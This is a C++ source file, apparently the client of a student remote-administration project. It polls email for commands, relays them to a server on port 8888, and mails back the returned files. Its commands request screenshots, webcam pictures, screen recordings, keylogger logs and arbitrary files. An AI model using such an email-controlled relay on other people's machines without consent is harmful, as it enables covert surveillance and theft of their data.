#include "../Application/lib.h"
#include "../Application/checkCommand.h"
#include <filesystem>

const string saveDir = "C:/MMT/";

SOCKET connect_to_server(const std::string &host, int port) {
  WSADATA wsa;
  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
    std::cerr << "[Client] WSAStartup failed: " << WSAGetLastError() << "\n";
    return INVALID_SOCKET;
  }

  SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock == INVALID_SOCKET) {
    std::cerr << "[Client] Socket creation failed: " << WSAGetLastError()
              << "\n";
    WSACleanup();
    return INVALID_SOCKET;
  }

  sockaddr_in serverAddr{};
  serverAddr.sin_family = AF_INET;
  serverAddr.sin_port = htons(port);
  inet_pton(AF_INET, host.c_str(), &serverAddr.sin_addr);

  if (connect(sock, (sockaddr *)&serverAddr, sizeof(serverAddr)) ==
      SOCKET_ERROR) {
    std::cerr << "[Client] Connection failed: " << WSAGetLastError() << "\n";
    closesocket(sock);
    WSACleanup();
    return INVALID_SOCKET;
  }

  std::cout << "[Client] Connected to server " << host << ":" << port << "\n";
  return sock;
}

// Nhận file từ server
void receive_file(SOCKET sock, const std::string &filename) {
  std::filesystem::create_directories(saveDir);

  size_t fileSize;
  recv(sock, reinterpret_cast<char *>(&fileSize), sizeof(fileSize), 0);

  if (fileSize == 0) {
    std::cerr << "[Client] No file received.\n";
    return;
  }

  std::ofstream file(saveDir + filename, std::ios::binary);
  char buffer[4096];
  size_t bytesReceived = 0;

  while (bytesReceived < fileSize) {
    int chunk = recv(sock, buffer, sizeof(buffer), 0);
    if (chunk <= 0) break;
    file.write(buffer, chunk);
    bytesReceived += chunk;
  }

  std::cout << "[Client] File received: " << saveDir + filename << " ("
            << bytesReceived << " bytes)\n";
}

static std::atomic<bool> running(true);

std::map<std::string, std::pair<std::string, std::string>> fileCommands = {
    {"get_screenshot", {"Screenshot from server", saveDir + "screenshot.png"}},
    {"get_picture", {"Picture from server", saveDir + "picture.png"}},
    {"list_program", {"Program list from server", saveDir + "programs.txt"}},
    {"list_process", {"Process list from server", saveDir + "processes.txt"}},
    {"get_recording",
     {"Video recording from server", saveDir + "recording.avi"}},
    {"keylogger", {"Keylogger log from server", saveDir + "keylog.txt"}}};

void signal_handler(int) { running.store(false); }

void process_command(const std::string &command,
                     const std::string &senderEmail) {
  SOCKET sock = connect_to_server("127.0.0.1", 8888);
  if (sock == INVALID_SOCKET) {
    std::cerr << "[Client] Could not connect to server\n";
    return;
  }

  std::string payload = senderEmail + "\n" + command;
  send(sock, payload.c_str(), payload.size(), 0);

  // Xử lý command send_file
  if (command.find("send_file") == 0) {
    std::string filepath = command.substr(9);  // Bỏ "send_file "
    // Trim spaces
    filepath.erase(filepath.begin(),
                   find_if(filepath.begin(), filepath.end(),
                           [](int ch) { return !isspace(ch); }));

    if (!filepath.empty()) {
      // Lấy tên file từ đường dẫn đầy đủ
      std::filesystem::path path(filepath);
      std::string filename = path.filename().string();

      receive_file(sock, filename);
      send_email_with_attachment(senderEmail, "File from remote computer",
                                 "Requested file: " + filepath,
                                 saveDir + filename);
    }
  } else if (fileCommands.count(command)) {
    auto [subject, localFile] = fileCommands[command];
    std::string filename = std::filesystem::path(localFile).filename().string();
    receive_file(sock, filename);
    send_email_with_attachment(senderEmail, subject,
                               "Requested file from server", localFile);
  }

  closesocket(sock);
}

int main() {
  std::signal(SIGINT, signal_handler);
  std::signal(SIGTERM, signal_handler);

  curl_global_init(CURL_GLOBAL_DEFAULT);

  while (running.load()) {
    auto commands = fetch_email_commands();
    for (auto &[cmd, senderEmail] : commands) {
      process_command(cmd, senderEmail);
    }
    std::this_thread::sleep_for(std::chrono::seconds(10));
  }

  curl_global_cleanup();
  return 0;
}